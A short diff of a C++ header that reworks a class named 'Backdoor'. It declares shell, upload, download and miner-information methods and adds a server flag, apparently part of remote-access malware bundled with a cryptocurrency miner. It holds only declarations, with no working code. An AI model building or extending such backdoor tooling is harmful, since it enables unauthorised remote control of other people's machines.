@@ -6,17 +6,18 @@
 class Backdoor{
 public:
     void shell();
-    void upload();
-    void download();
+    void upload(char *);
+    void download(char *);
     void get_miner_info();
     
 
-    Backdoor(char *, int);
-private:
-    int port;
-    char * ip;
+    Backdoor(char *, int, bool);
 
-    Communication c;
+private:
+
+    Communication *c;
+    bool is_server;
+
 };
 
 
